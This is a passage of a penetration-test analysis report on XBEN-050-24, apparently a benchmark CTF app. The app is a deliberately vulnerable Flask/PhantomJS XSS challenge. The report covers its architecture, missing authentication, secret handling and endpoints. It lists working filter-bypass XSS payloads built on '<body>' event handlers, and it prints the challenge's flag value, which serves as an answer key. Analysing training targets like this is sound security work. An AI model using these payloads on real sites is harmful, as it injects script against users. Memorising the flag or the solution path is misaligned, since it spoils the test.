# Penetration Test Code Analysis Report - XBEN-050-24

**Target Application:** XBEN-050-24 (Dalgona XSS Challenge)  
**Analysis Date:** October 30, 2025  
**Technology Stack:** Python 2.7.18 + Flask 1.1.4 + PhantomJS 2.1.1  
**Application Type:** Deliberately Vulnerable CTF/Security Training Application  
**Deployment:** Docker Containerized (Port 5000 → Host Port 38583)

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings reported meet the "In-Scope" criteria defined below.

## In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints (`/` and `/page`)
- Static file serving (`/static/*`)
- Server-side processes triggered by HTTP requests (PhantomJS validation)
- Background processing initiated through network-accessible entry points

## Out-of-Scope: Locally Executable Only
Components **excluded** from this analysis:
- Command-line interface tools requiring manual execution
- Development environment tooling (build scripts, CI/CD)
- Database migration scripts (none exist in this application)
- Local development utilities
- Docker build process itself (analyzed for security implications only)

---

## 1. Executive Summary

XBEN-050-24 is a deliberately vulnerable Flask web application designed as a Cross-Site Scripting (XSS) security challenge. The application presents a minimalist attack surface with only two HTTP endpoints and no authentication mechanisms, running on a severely outdated technology stack (Python 2.7.18, EOL since January 2020). 

The application's security posture is **intentionally weak** to serve as a CTF challenge. It employs a bypassable regex-based XSS filter that specifically allows `<body>` tags while blocking other HTML elements, creating the intended vulnerability path. The application uses PhantomJS (abandoned since 2018) to validate whether user input triggers JavaScript alerts, disclosing a flag upon successful XSS exploitation with the exact string "XSS".

**Critical Security Characteristics:**
- **No authentication or authorization** - All endpoints are publicly accessible
- **No encryption** - Flag stored in plaintext, transmitted over HTTP
- **Outdated stack** - Python 2.7 (5+ years past EOL), Flask 1.1.4, PhantomJS 2.1.1 (all with known unpatched vulnerabilities)
- **Debug mode enabled** - Exposes stack traces and potentially allows code execution via Werkzeug debugger
- **Minimal input validation** - Regex blacklist filter specifically designed to be bypassable
- **Stateless architecture** - No database, no sessions, no data persistence beyond temporary files

**Primary Attack Vectors:**
1. **XSS via `/page?name=` parameter** - Bypass weak regex filter using `<body>` tag event handlers
2. **Information disclosure** - Debug mode, verbose logging, unprotected flag storage
3. **Temporary file race conditions** - HTML files briefly exposed in `/static/` directory (~5 second window)
4. **Indirect SSRF** - PhantomJS can be coerced to fetch external resources via HTML attributes

This application serves its intended purpose as a security training exercise but would represent a catastrophic security failure if deployed in any production context.

---

## 2. Architecture & Technology Stack

### Framework & Language

**Primary Framework:** Flask 1.1.4 (Released May 2021, 4+ years outdated)
- **Location:** `/src/requirements.txt` line 1
- **WSGI Server:** Werkzeug 1.0.1 (development server, not production-ready)
- **Security Implications:** 
  - Known CVE-2023-30861 (session cookie disclosure)
  - CVE-2018-1000656 (DoS via crafted JSON)
  - Vulnerable to Server-Side Template Injection (SSTI) if user input reaches Jinja2 templates
  - **Note:** This application bypasses Jinja2 protections by using raw HTML strings

**Runtime Language:** Python 2.7.18
- **Location:** `/src/Dockerfile` line 2 (`FROM python:2.7.18-slim`)
- **EOL Status:** CRITICAL - End of Life since January 1, 2020 (5+ years without security patches)
- **Known Vulnerabilities:** 200+ unpatched CVEs including:
  - CVE-2021-3737 (HTTP client infinite loop DoS)
  - CVE-2021-3733 (ReDoS in urllib.request)
  - CVE-2021-28861 (Open redirect in HTTP server)
  - CVE-2020-26116 (HTTP header injection)
  - CVE-2019-20907 (Infinite loop in tarfile)
- **Character Encoding:** UTF-8 forced via `sys.setdefaultencoding('utf8')` in `/src/app.py` line 20

**JavaScript Runtime:** PhantomJS 2.1.1
- **Location:** `/src/Dockerfile` line 10, wrapper at `/src/check.js`
- **Status:** ABANDONED - Project discontinued in 2018 (7+ years without updates)
- **Security Implications:**
  - CVE-2019-17221 (Arbitrary file read)
  - CVE-2018-11518 (Use-after-free leading to RCE)
  - CVE-2018-7160 (Denial of Service)
  - Numerous unfixed WebKit vulnerabilities (engine frozen since 2016)
  - Can be leveraged for SSRF attacks
  - Full filesystem access without sandboxing

**Template Engine:** Jinja2 2.11.3
- **Security Status:** Older version with known vulnerabilities
- **Critical Finding:** NOT ACTUALLY USED for rendering - templates are raw HTML strings in `constants.py`, bypassing Jinja2's auto-escaping protections
- **Implications:** Application loses built-in XSS protection that Flask/Jinja2 normally provides

### Architectural Pattern

**Pattern:** Monolithic Single-Container Application (Stateless)

The application implements a minimalist request-response architecture with no persistence layer:

```
External Request (Port 38583)
    ↓
Docker Container (10.89.80.2:5000)
    ↓
Flask/Werkzeug Dev Server
    ↓
Flask Route Handler (app.py)
    ↓
Regex Filter (Intentionally Weak)
    ↓
HTML Template Generation (constants.py)
    ↓
Temporary File Creation (static/*.html)
    ↓
PhantomJS Subprocess (check.js)
    ↓
JavaScript Alert Detection
    ↓
Flag Disclosure (if alert("XSS") triggered)
    ↓
HTML Response to User
```

**Trust Boundaries:**

1. **External Internet → Docker Host:** Port 38583 exposed on host network (192.168.127.1)
2. **Docker Host → Container:** Port mapping 38583:5000, Docker bridge network
3. **Container Network → Flask Application:** No authentication barrier, all requests accepted
4. **Flask Application → Filesystem:** Temporary file creation in `static/` directory (web-accessible)
5. **Flask Application → Subprocess:** PhantomJS execution via `subprocess.Popen()` with user-influenced content
6. **Subprocess → Localhost HTTP:** PhantomJS makes loopback request to `localhost:5000` to load user-generated HTML
7. **Application → Secret Storage:** Direct file read of plaintext `secret.txt` containing flag

**Critical Trust Boundary Violation:** User input flows directly from external network through weak filtering into PhantomJS execution context, allowing arbitrary JavaScript execution in the headless browser.

### Critical Security Components

**Input Validation (Intentionally Weak):**
- **Location:** `/src/app.py` lines 66-67
- **Implementation:** `blacklist = r'<(?!body\b)[^>]+>'` - Regex that removes all HTML tags EXCEPT `<body>`
- **Security Posture:** BYPASSABLE by design - allows `<body onload=alert('XSS')>` and similar event handler attacks
- **Applied To:** `GET /page?name=` parameter only
- **Not Applied To:** Static file serving, index page (no user input)

**Output Encoding (Inconsistent):**
- **Location:** `/src/app.py` line 58 - Uses `cgi.escape()` for PhantomJS result output
- **Missing:** Lines 56, 68, 70, 72 - User input and flag rendered without escaping
- **Critical Gap:** Jinja2 auto-escaping NOT utilized (raw HTML strings used instead)

**Subprocess Execution:**
- **Location:** `/src/app.py` lines 34-50
- **Command:** `["timeout","5","phantomjs", "check.js"]` (list format, no shell injection risk)
- **Protection:** 5-second timeout prevents indefinite hanging
- **Risk:** User-controlled HTML content executed in PhantomJS JavaScript context
- **Race Condition:** Temporary files exist in web-accessible `static/` directory for ~5 seconds

**Secret Storage:**
- **Location:** `/src/secret.txt` (container path: `/python-docker/secret.txt`)
- **Format:** Plaintext, no encryption
- **Access Control:** None - any code with file read access can retrieve flag
- **Injection Method:** Docker build-time `sed` replacement of `@FLAG@` placeholder
- **Exposure Risk:** Flag visible in Docker image layers via `docker history`

### Infrastructure Configuration

**Container Security:**
- **Base Image:** `python:2.7.18-slim` on Debian Buster (EOL)
- **Package Sources:** `archive.debian.org` (no security updates available)
- **User Context:** Root (no USER directive in Dockerfile - security risk)
- **Capabilities:** Default (no restrictions applied)
- **Security Options:** None (no AppArmor, SELinux, seccomp profiles)
- **Resource Limits:** None configured (vulnerable to resource exhaustion)

**Critical Misconfigurations:**
1. **`ENV OPENSSL_CONF=/dev/null`** (line 13) - Disables OpenSSL configuration, bypassing SSL/TLS security checks
2. **`ENV QT_QPA_PLATFORM=offscreen`** (line 12) - Required for PhantomJS but disables display security features
3. **Debug mode enabled** (`app.run(debug=True)` in `/src/app.py` line 76) - Exposes Werkzeug debugger (potential RCE)
4. **`app.config['PROPAGATE_EXCEPTIONS'] = True`** (line 25) - Exposes detailed error information to users

**Network Configuration:**
- **Exposed Port:** 5000 (container) → 38583 (host)
- **Protocol:** HTTP only (no HTTPS/TLS)
- **Network Mode:** Bridge (default Docker network `xben-050-24_default`)
- **Container IP:** 10.89.80.2
- **Healthcheck:** TCP connection test to `127.0.0.1:5000` every 10 seconds

**Deployment Model:**
- **Orchestration:** Docker Compose (`docker-compose.yml`)
- **Build Arguments:** FLAG passed as ARG (visible in image history - security vulnerability)
- **Environment Variables:** Minimal - only runtime paths and QT configuration
- **Secrets Management:** INSECURE - flag injected at build time, visible in layers

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms

**Finding:** NO AUTHENTICATION IMPLEMENTED

This application has **zero authentication mechanisms** of any kind. There are no login flows, credential validation systems, user management capabilities, token generation, password storage, multi-factor authentication, or identity verification of any form.

**All API Endpoints (Authentication Status):**

| Endpoint | HTTP Method | Authentication Required | Authorization Level |
|----------|-------------|------------------------|---------------------|
| `/` | GET | None | Public |
| `/page` | GET | None | Public |
| `/static/*` | GET | None | Public |

**Code Evidence:**
- **Location:** `/src/app.py` lines 29-31 (index endpoint)
```python
@app.route('/')
def index():
    return INDEX_CONTENT
```
No `@login_required`, no authentication decorators, no credential checks.

- **Location:** `/src/app.py` lines 63-72 (challenge endpoint)
```python
@app.route('/page')
def page22():
    msg = request.args.get('name','')
    # ... no authentication checks ...
```

**Search Results:**
- No imports of authentication libraries: `flask-login`, `flask-security`, `authlib`, `python-jose`
- No JWT handling: No `jwt.decode()`, `jwt.encode()`, or PyJWT library
- No OAuth/OIDC: No OAuth client libraries, no callback endpoints
- No API key validation: No header checks, no token verification
- No basic auth: No `request.authorization` usage

**Security Implications:**
- **Unlimited Access:** Any network-reachable client can access all endpoints without identification
- **No Rate Limiting:** No authentication means no per-user rate limiting (vulnerable to DoS)
- **Flag Exposure:** Anyone who bypasses the XSS filter receives the flag (no access control)
- **Audit Trail:** No ability to track which users access what resources
- **Trust Model:** Application trusts all incoming requests equally

### Session Management

**Finding:** NO SESSION MANAGEMENT CONFIGURED

The application is completely stateless with no session creation, storage, or management capabilities.

**Session Cookie Flags - EXACT CONFIGURATION LOCATION:**

**DOES NOT EXIST** - No session cookies are configured anywhere in the codebase.

**Code Evidence:**
- **Flask App Initialization:** `/src/app.py` lines 24-25
```python
app = Flask(__name__)
app.config['PROPAGATE_EXCEPTIONS'] = True
```
**Missing Configuration:**
- No `app.secret_key` set (required for Flask sessions)
- No `app.config['SESSION_COOKIE_HTTPONLY']` configuration
- No `app.config['SESSION_COOKIE_SECURE']` configuration  
- No `app.config['SESSION_COOKIE_SAMESITE']` configuration
- No `app.config['PERMANENT_SESSION_LIFETIME']` configuration

**Search Results:**
```bash
# Searched for session cookie configuration
grep -rn "SESSION_COOKIE_HTTPONLY\|SESSION_COOKIE_SECURE\|SESSION_COOKIE_SAMESITE" /src/
# Result: No matches found

# Searched for cookie setting operations
grep -rn "set_cookie\|make_response.*cookie" /src/
# Result: No matches found

# Searched for session usage
grep -rn "from flask import.*session\|flask.session" /src/
# Result: No matches found
```

**Session-Related Functionality:**
- **Session Creation:** NOT IMPLEMENTED
- **Session Storage:** NOT IMPLEMENTED (no Redis, Memcached, database, or file-based sessions)
- **Session Timeout:** NOT APPLICABLE (no sessions exist)
- **Session Invalidation:** NOT APPLICABLE (no logout functionality)
- **Token Refresh:** NOT IMPLEMENTED (no tokens exist)

**Security Assessment:**
- **HttpOnly Flag:** ❌ NOT SET (no cookies exist)
- **Secure Flag:** ❌ NOT SET (no cookies exist)
- **SameSite Flag:** ❌ NOT SET (no cookies exist)
- **Session Fixation Risk:** ✓ MITIGATED (no sessions to fix)
- **Session Hijacking Risk:** ✓ MITIGATED (no sessions to hijack)
- **CSRF Risk:** ⚠️ MODERATE (no CSRF tokens, but no state-changing operations either)

**Implications:**
- Application cannot track user state between requests
- No "remember me" functionality possible
- No shopping cart, preferences, or user-specific data
- Each request is independent and anonymous

### Authorization Model

**Finding:** NO AUTHORIZATION CONTROLS

The application has no Role-Based Access Control (RBAC), Attribute-Based Access Control (ABAC), permission checking logic, multi-tenancy isolation, or privilege levels of any kind.

**Permission Check Locations:** NONE FOUND

**Code Evidence:**
```python
# /src/app.py - All endpoints are equally accessible
@app.route('/')
def index():
    return INDEX_CONTENT  # No role checks

@app.route('/page')
def page22():
    msg = request.args.get('name','')  # No permission validation
    # ... XSS challenge logic ...
    # Line 56: Flag disclosure has NO authorization check
    if result == 'XSS':
        data = '<div>Here is the flag: {1}</div>'.format(..., flag)
```

**Authorization Architecture:** ABSENT

**Search Results:**
- No decorator patterns for authorization: `@requires_role`, `@permission_required`, `@admin_only`
- No permission checking functions: `has_permission()`, `check_role()`, `is_authorized()`
- No role definitions: No `ADMIN`, `USER`, `GUEST` constants or enums
- No access control lists (ACLs)
- No policy enforcement points

**Privilege Escalation Assessment:**
- **Horizontal Privilege Escalation:** NOT POSSIBLE (no users or privileges exist)
- **Vertical Privilege Escalation:** NOT POSSIBLE (no privilege levels exist)
- **Trust Boundary Violations:** TOTAL - All users have equal access to all functionality

**Multi-Tenancy Analysis:**
- **Tenant Isolation:** NOT APPLICABLE (no multi-tenancy)
- **Data Segregation:** NOT APPLICABLE (no data persistence)
- **Cross-Tenant Access:** NOT APPLICABLE (single tenant application)

**Flag Disclosure Authorization:**
- **Who Can Access Flag:** ANYONE who successfully triggers `alert("XSS")` in PhantomJS
- **Authorization Check:** Technical challenge (bypassing XSS filter), NOT identity-based authorization
- **Access Control:** Skill-based (requires XSS knowledge), not credential-based

### SSO/OAuth/OIDC Flows

**Finding:** NO SSO, OAUTH, OR OIDC IMPLEMENTATIONS

**Search Results:**
```bash
# Searched for OAuth/OIDC libraries
grep -rn "authlib\|oauthlib\|python-jose\|requests-oauthlib" /src/
# Result: No matches

# Searched for OAuth endpoints
grep -rn "oauth\|/callback\|/authorize\|/token" /src/
# Result: No matches

# Searched for OIDC discovery
grep -rn "well-known/openid-configuration\|/.well-known" /src/
# Result: No matches
```

**OAuth/OIDC Components:** NONE FOUND
- **Authorization Endpoints:** None
- **Token Endpoints:** None
- **Callback Endpoints:** None
- **State Parameter Validation:** NOT APPLICABLE (no OAuth flow)
- **Nonce Parameter Validation:** NOT APPLICABLE (no OIDC flow)
- **PKCE Implementation:** None
- **JWT Validation:** None
- **JWKS Fetching:** None

**SSO Integration:** NOT IMPLEMENTED
- No SAML support
- No OpenID Connect providers
- No social login (Google, Facebook, GitHub, etc.)
- No enterprise identity providers (Okta, Auth0, Azure AD)

**Security Headers Related to Authentication:**
```bash
# Checked for authentication-related headers
grep -rn "WWW-Authenticate\|Authorization.*Bearer" /src/
# Result: No matches
```

**Assessment:**
This application has no external identity provider integration and no federated authentication mechanisms. All authentication and authorization infrastructure is completely absent by design.

### Summary: Authentication & Authorization Posture

| Security Control | Status | Risk Level |
|------------------|--------|------------|
| Authentication Mechanisms | ❌ Absent | CRITICAL |
| Session Management | ❌ Absent | CRITICAL |
| Authorization Controls | ❌ Absent | CRITICAL |
| Session Cookie Flags | ❌ N/A (no cookies) | N/A |
| OAuth/OIDC Integration | ❌ Absent | N/A |
| Multi-Factor Authentication | ❌ Absent | N/A |
| Rate Limiting (auth-based) | ❌ Absent | HIGH |
| Audit Logging | ⚠️ Basic print statements only | HIGH |

**Conclusion:** This application operates as a completely open, unauthenticated service where any network-reachable client has identical access to all functionality. The only "access control" is the technical challenge of bypassing the XSS filter - once bypassed, the flag is immediately disclosed with no identity verification.

---

## 4. Data Security & Storage

### Database Security

**Finding:** NO DATABASE DETECTED

This application is completely stateless with no database infrastructure:

**Database Analysis:**
- **Database Type:** NONE
- **ORM/Query Libraries:** NONE (no SQLAlchemy, Django ORM, PyMongo, psycopg2, mysql-connector, sqlite3 usage)
- **Connection Strings:** NONE
- **Query Parameterization:** NOT APPLICABLE
- **SQL Injection Risk:** NONE (no SQL queries)
- **Database Encryption at Rest:** NOT APPLICABLE
- **Database Access Control:** NOT APPLICABLE

**Code Evidence:**
```python
# /src/requirements.txt - Only 2 dependencies
Flask==1.1.4
phantomjs==1.4.1
# No database libraries present
```

**Search Results:**
```bash
# Searched for database imports
grep -rn "import.*sql\|from.*sql\|SQLAlchemy\|psycopg\|pymongo\|mysql" /src/
# Result: No matches

# Searched for database connections
grep -rn "connect\|cursor\|query\|execute" /src/
# Result: Only subprocess.Popen matches (not database-related)
```

**Data Persistence:** The only persistent storage is the plaintext `secret.txt` file containing the flag. All other data is transient (temporary files deleted after processing).

### Data Flow Security

**Sensitive Data Flows Identified:**

**Flow 1: Flag Retrieval and Disclosure**
```
/src/secret.txt (plaintext file)
    ↓ [File Read - Line 22]
open('secret.txt').read().split()
    ↓ [Stored in memory]
flags[0] variable
    ↓ [Passed to validation function]
check_input(data, flags[0], msg, 'level_medium')
    ↓ [Conditional disclosure - Line 56]
if result == 'XSS': display flag in HTML
    ↓ [HTTP Response]
Transmitted to client (no encryption)
```

**Protection Mechanisms:** NONE
- No encryption in transit (HTTP only, no HTTPS)
- No encryption at rest (plaintext file storage)
- No access control (anyone can trigger flag disclosure)
- No data masking or redaction
- No secure deletion after disclosure

**Flow 2: User Input Processing**
```
HTTP GET /page?name=<payload>
    ↓ [Parameter extraction - Line 64]
request.args.get('name','')
    ↓ [Weak filtering - Lines 66-67]
Regex blacklist removes tags except <body>
    ↓ [Template injection - Line 68]
value = '{0}'.format(msg)
    ↓ [File write - Lines 35-40]
Written to static/<random>.html
    ↓ [PhantomJS execution - Lines 34-50]
Loaded by PhantomJS (JavaScript execution)
    ↓ [Logging - Lines 41-47]
Printed to stdout (user input logged)
    ↓ [Cleanup - Line 50]
os.unlink(fn) - File deleted
```

**Vulnerabilities:**
1. **User input logged** (Line 41-47) - Potential log injection, XSS payload exposure
2. **Race condition** - Temporary files accessible via HTTP for ~5 seconds
3. **No input size limits** - Vulnerable to disk exhaustion
4. **No content validation** - Any content written to filesystem

**Flow 3: Docker Build-Time Flag Injection**
```
.env file (FLAG=flag{...})
    ↓ [Docker Compose - docker-compose.yml lines 5-6]
Build argument: --build-arg FLAG=<value>
    ↓ [Dockerfile - lines 24-26]
ARG FLAG
RUN sed -i s/@FLAG@/$FLAG/g secret.txt
    ↓ [Image layer created]
Flag visible in docker history
    ↓ [Runtime]
secret.txt contains actual flag
```

**Security Issues:**
1. **Build args are not secure** - Visible in `docker history <image>`
2. **Flag persists in image layers** - Cannot be fully removed without rebuilding
3. **No encryption** - Flag stored as plaintext in image
4. **Version control exposure** - `.env` file contains flag (if committed)

### Encryption Implementations

**Finding:** NO ENCRYPTION ANYWHERE

**Cryptographic Libraries:** NONE FOUND

**Search Results:**
```bash
# Searched for encryption imports
grep -rn "from cryptography\|import hashlib\|import bcrypt\|import ssl\|import hmac" /src/
# Result: No matches

# Searched for encryption operations
grep -rn "encrypt\|decrypt\|AES\|RSA\|SHA256\|MD5\|pbkdf2" /src/
# Result: No matches

# Checked requirements.txt
cat /src/requirements.txt
# Flask==1.1.4
# phantomjs==1.4.1
# No cryptographic libraries
```

**Missing Encryption:**
1. **Data at Rest:** Flag stored in plaintext in `secret.txt` and Docker image layers
2. **Data in Transit:** HTTP only (no HTTPS/TLS configuration)
3. **Password Storage:** NOT APPLICABLE (no user accounts)
4. **Token Encryption:** NOT APPLICABLE (no tokens)
5. **API Key Protection:** NOT APPLICABLE (no API keys)
6. **Database Encryption:** NOT APPLICABLE (no database)

**TLS/SSL Configuration:** ABSENT
- **Location Checked:** `/src/app.py` line 76: `app.run(debug=True)` 
- No SSL context configured
- No certificate files (.crt, .key, .pem) found
- Environment variable `OPENSSL_CONF=/dev/null` DISABLES OpenSSL configuration
- Container runs HTTP only on port 5000

**Impact:**
- All data transmitted in cleartext
- Flag exposed in Docker image layers
- No protection against network eavesdropping
- Vulnerable to man-in-the-middle attacks

**Flask Secret Key:** NOT CONFIGURED
```python
# /src/app.py lines 24-25
app = Flask(__name__)
app.config['PROPAGATE_EXCEPTIONS'] = True
# No app.secret_key = '...' configuration found
```
**Implications:** If sessions were used, they would be cryptographically insecure.

### Secret Management

**Finding:** INSECURE SECRET STORAGE

**Secret Storage Locations:**

1. **Runtime Secret File:** `/src/secret.txt`
   - **Format:** Plaintext
   - **Permissions:** Default (world-readable in container)
   - **Access Control:** None
   - **Code Location:** `/src/app.py` line 22
   ```python
   flags = open('secret.txt').read().split()
   ```

2. **Build-Time Secret Injection:** `docker-compose.yml` + `Dockerfile`
   - **Method:** Docker build argument (INSECURE)
   - **Exposure:** Visible in `docker history`, `docker inspect`
   - **Code Location:** `/src/Dockerfile` lines 24-26
   ```dockerfile
   ARG FLAG
   RUN sed -i s/@FLAG@/$FLAG/g secret.txt
   ```

3. **Development Environment:** `.env` file
   - **Content:** `FLAG="flag{9e5f344a-0906-4866-bc8c-7cdf2163f9d3}"`
   - **Risk:** If committed to version control, permanently exposed in git history

**Secret Management Assessment:**

| Best Practice | Implementation Status | Risk Level |
|--------------|----------------------|------------|
| Environment Variables | ❌ Not Used | HIGH |
| Secret Encryption | ❌ Not Implemented | CRITICAL |
| Secret Rotation | ❌ Not Possible | HIGH |
| Access Control | ❌ None | CRITICAL |
| Secure Storage (Vault, etc.) | ❌ Not Used | HIGH |
| .gitignore for secrets | ⚠️ Unknown (not verified) | MEDIUM |
| Docker Secrets | ❌ Not Used | HIGH |
| Least Privilege Access | ❌ Root user has access | MEDIUM |

**Secret Exposure Vectors:**
1. **Docker Image Layers:** `docker history <image>` reveals flag substitution command
2. **Container Filesystem:** `docker exec <container> cat /python-docker/secret.txt`
3. **Application Memory:** `flags[0]` variable accessible to all code
4. **HTTP Response:** Flag disclosed when XSS succeeds (intentional for CTF)
5. **Logs:** Flag may appear in logs if XSS payload triggers error

**Recommendations (for production systems):**
- Use Docker secrets (`docker secret create`) instead of build args
- Store secrets in environment variables at minimum
- Implement secret rotation mechanisms
- Use dedicated secret management (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault)
- Never commit secrets to version control
- Use `.gitignore` to exclude `.env`, `secret.txt`, `*.key`, `*.pem`
- Implement least-privilege access (non-root container user)

### Multi-Tenant Data Isolation

**Finding:** NOT APPLICABLE (Single-Tenant Architecture)

This application has no multi-tenancy features:
- No user accounts or organization separation
- No tenant-specific data partitioning
- No database schema separation
- No data isolation requirements

**Assessment:** No multi-tenancy security concerns exist.

### Data Protection Summary

**Data Security Posture:**

| Component | Status | Encryption | Access Control | Audit Logging |
|-----------|--------|------------|----------------|---------------|
| Flag Storage | Plaintext file | ❌ None | ❌ None | ❌ None |
| User Input | Temporary files | ❌ None | ❌ None | ⚠️ Logged to stdout |
| HTTP Traffic | Cleartext | ❌ None | ❌ None | ❌ None |
| Docker Secrets | Build args (insecure) | ❌ None | ❌ None | ✓ Visible in history |
| Database | N/A (none exists) | N/A | N/A | N/A |

**Critical Findings:**
1. **No encryption anywhere** - Data at rest and in transit both unencrypted
2. **Insecure secret storage** - Flag in plaintext, exposed in Docker layers
3. **No access controls** - Any process can read secrets
4. **Minimal data handling** - But what exists is completely insecure
5. **No compliance posture** - GDPR/PCI/HIPAA not applicable (no sensitive user data)

**Conclusion:** The application has minimal data handling (only CTF flag), but manages that data with zero security controls. This is acceptable for a CTF training environment but would be catastrophic for any production system handling real sensitive data.

---

## 5. Attack Surface Analysis

### External Entry Points (Network-Accessible)

**Total Network-Accessible Endpoints:** 3 (2 application routes + 1 static file serving)

#### Entry Point 1: Index/Landing Page

**Route:** `/`  
**HTTP Method:** GET  
**File Path:** `/src/app.py` lines 29-31  
**Authentication:** Public (no authentication required)  
**Authorization:** Public (no role requirements)

**Code:**
```python
@app.route('/')
def index():
    return INDEX_CONTENT
```

**Functionality:** Returns static HTML landing page with navigation to XSS challenge

**Input Parameters:** None

**Security Analysis:**
- **Input Validation:** Not applicable (no user input accepted)
- **Output Encoding:** Raw HTML from `constants.py` (no templating)
- **Attack Vectors:** Minimal - static content delivery
- **Rate Limiting:** None
- **CSRF Protection:** Not applicable (no state changes)

**HTML Content Source:** `/src/constants.py` lines 1-30 (INDEX_CONTENT constant)

**Attack Surface Rating:** LOW (static content, no user input)

---

#### Entry Point 2: XSS Challenge Page (PRIMARY ATTACK SURFACE)

**Route:** `/page`  
**HTTP Method:** GET  
**File Path:** `/src/app.py` lines 63-72  
**Authentication:** Public (no authentication required)  
**Authorization:** Public (no role requirements)

**Code:**
```python
@app.route('/page')
def page22():
    msg = request.args.get('name','')
    blacklist = r'<(?!body\b)[^>]+>'
    msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
    value =  "" if msg == "" else '{0}'.format(msg)
    
    data = XSS_CONTENT_TAG.format("22", "Star", value, "", "")
    result = check_input(data,flags[0],msg,'level_medium')
    return XSS_CONTENT_TAG.format("22", "Star", value, result, "")
```

**Input Parameters:**
- **Parameter Name:** `name`
- **Type:** Query string parameter
- **Required:** Optional (defaults to empty string)
- **Expected Format:** String (intended for names, accepts any input)
- **Size Limits:** NONE (vulnerable to resource exhaustion)
- **Validation:** Weak regex blacklist filter only

**Input Validation Pattern (INTENTIONALLY WEAK):**
```python
# Line 66: Blacklist removes all HTML tags EXCEPT <body>
blacklist = r'<(?!body\b)[^>]+>'
msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
```

**Validation Bypass Vectors:**
1. **Event handler injection:** `<body onload=alert('XSS')>`
2. **Alternative events:** `<body onfocus=alert('XSS') autofocus>`
3. **Case variations:** `<BoDy OnLoAd=alert('XSS')>` (handled by re.IGNORECASE)
4. **Encoded payloads:** May bypass depending on decoding context
5. **Attribute-based XSS:** `<body background="javascript:alert('XSS')">`

**Data Flow:**
```
GET /page?name=<payload>
    ↓
request.args.get('name','')
    ↓
Regex filter (removes non-<body> tags)
    ↓
String formatting: '{0}'.format(msg)
    ↓
Template injection: XSS_CONTENT_TAG.format(..., value, ...)
    ↓
Temporary file creation: static/<random>.html
    ↓
PhantomJS execution (loads file via localhost:5000)
    ↓
JavaScript alert detection
    ↓
Flag disclosure if alert("XSS") detected
```

**Attack Vectors:**

1. **XSS via Body Tag Event Handlers** (PRIMARY)
   - **Payload:** `?name=<body onload=alert('XSS')>`
   - **Impact:** Flag disclosure
   - **Exploitability:** HIGH (intended challenge path)

2. **Temporary File Race Condition**
   - **Attack:** Access `http://localhost:5000/static/<random>.html` before deletion
   - **Window:** ~5 seconds (PhantomJS timeout period)
   - **Impact:** Information disclosure, XSS payload visibility
   - **Exploitability:** LOW (requires guessing random 32-character hex filename)

3. **Resource Exhaustion**
   - **Attack:** Send extremely large `name` parameter
   - **Impact:** Disk space exhaustion, memory exhaustion, DoS
   - **Exploitability:** HIGH (no size limits enforced)

4. **Log Injection**
   - **Attack:** Inject ANSI escape codes, log forging payloads
   - **Impact:** Log poisoning, terminal hijacking if logs viewed in terminal
   - **Exploitability:** MEDIUM (requires log access)

**Security Controls:**
- **Input Validation:** ❌ WEAK (bypassable regex)
- **Output Encoding:** ❌ ABSENT (no escaping of user input)
- **Rate Limiting:** ❌ NONE
- **CSRF Protection:** ✓ NOT NEEDED (GET request, no state changes except flag disclosure)
- **Content Security Policy:** ❌ NONE
- **X-XSS-Protection Header:** ❌ NONE

**Attack Surface Rating:** CRITICAL (primary vulnerability, flag disclosure path)

---

#### Entry Point 3: Static File Serving

**Route:** `/static/<path:filename>`  
**HTTP Method:** GET  
**File Path:** Flask built-in functionality  
**Authentication:** Public (no authentication required)

**Functionality:** Serves static assets from `/src/static/` directory

**Accessible Resources:**
- **CSS Files:** 
  - `/static/css/style.css` (main stylesheet)
  - `/static/css/styles/index.css` through `/static/css/styles/page6.css` (7 page-specific stylesheets)
- **Fonts:** `/static/css/fonts/*` (Game-Of-Squids font family)
- **Images:**
  - `/static/assets/fav-icon.png` (favicon)
  - `/static/img/logo5_white.png` (logo)
  - `/static/img/dalgonabg.jpg` (background)
  - `/static/img/cookies/*.png` (15 challenge status images)
- **Temporary Files:** `/static/<random>.html` (created during XSS validation, deleted after ~5s)

**Security Concerns:**

1. **Directory Traversal Risk:** LOW
   - Flask's built-in static serving protects against `../` path traversal
   - No custom path handling that could introduce vulnerabilities

2. **Temporary File Exposure:** MEDIUM
   - User-generated HTML files briefly accessible via HTTP
   - Filename: 32 hex characters (128-bit entropy - difficult to guess)
   - Race condition window: ~5 seconds
   - Files contain user-controlled XSS payloads

3. **Information Disclosure:** LOW
   - Static assets reveal application structure and design
   - No sensitive data in CSS/images
   - Temporary files deleted after processing

**Attack Vectors:**
- **Race Condition:** Attempt to access temporary HTML files before deletion
  - **Method:** Brute force random filenames or monitor network requests
  - **Impact:** View other users' XSS attempts, information disclosure
  - **Exploitability:** LOW (128-bit search space)

**Security Controls:**
- **Path Traversal Protection:** ✓ Flask built-in
- **Directory Listing:** ✓ Disabled (Flask default)
- **File Extension Restrictions:** ❌ NONE
- **Access Logging:** ⚠️ Basic only

**Attack Surface Rating:** LOW (standard static file serving with minor race condition)

---

### Internal Service Communication

**Finding:** NO INTERNAL MICROSERVICES

This is a monolithic single-container application with no service-to-service communication.

**Internal Communication Patterns:**

**PhantomJS Subprocess Communication:**
- **Initiator:** Flask application (`/src/app.py` line 34)
- **Target:** PhantomJS headless browser (local subprocess)
- **Protocol:** stdin/stdout pipes + HTTP loopback
- **Trust Model:** PhantomJS is trusted to execute user-controlled JavaScript

**Communication Flow:**
```
Flask App (PID 1)
    ↓ subprocess.Popen()
PhantomJS Process (Child PID)
    ↓ stdin: URL (http://localhost:5000/static/<random>.html)
PhantomJS Loads URL
    ↓ HTTP GET to localhost:5000
Flask App Serves Static File
    ↓ HTML Response
PhantomJS Executes JavaScript
    ↓ stdout: Alert/Confirm/Prompt output
Flask App Reads stdout
    ↓ Parse result
Flag Disclosure Decision
```

**Trust Boundary:**
- **Trusted:** Flask application code
- **Semi-Trusted:** PhantomJS binary (vulnerable to exploits)
- **Untrusted:** User input (XSS payloads)
- **Violation:** Untrusted user input executed in PhantomJS context

**Security Assumptions:**
1. PhantomJS will faithfully report alert() output (can be bypassed with exploits)
